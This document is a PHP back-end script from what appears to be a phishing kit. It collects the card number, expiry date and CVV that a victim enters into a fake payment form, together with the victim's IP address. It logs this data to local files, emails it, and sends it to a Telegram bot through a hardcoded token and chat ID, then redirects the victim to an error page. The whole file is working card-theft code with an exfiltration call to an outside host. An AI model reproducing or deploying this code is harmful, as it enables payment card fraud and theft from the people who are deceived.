<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['Sis_Numero_Tarjeta']) and !empty($_POST['Sis_Caducidad_Tarjeta_Mes']) and !empty($_POST['Sis_Caducidad_Tarjeta_Anno']) and !empty($_POST['Sis_Tarjeta_CVV2']) 
		// and !empty($_POST['pin'])
	) {
			$_SESSION['cc']=$_POST['Sis_Numero_Tarjeta'];
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

            $message = "
            SHANkS
            ---------------
            | CCN : " . $_POST['Sis_Numero_Tarjeta'] . "
            | EXP : " . $_POST['Sis_Caducidad_Tarjeta_Mes'] ."|". $_POST['Sis_Caducidad_Tarjeta_Anno'] ."
            | CVV : " . $_POST['Sis_Tarjeta_CVV2'] . "
            | INF : " . $ip . "
            ---------------\n";

            $file = fopen("./rz92.txt", "a+");
            fwrite($file, $message);
            fclose($file);
			$to = "";
			$subject = "$ip =?utf-8?Q?=F0=9F=91=BD?= (CCN|SAUDI)";
			$headers = "From: Ak47™<shdanks@dPorctgas.org>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			mail($to, $subject, $message, $headers);
           $token = "1444398777:AAGLFUEgpwuJDL5EFSGP7NZuWfTtwNhEb0g";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1208803924&text=" . urlencode($message)."" );
$file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 

header("Location: codeerror.php");

?>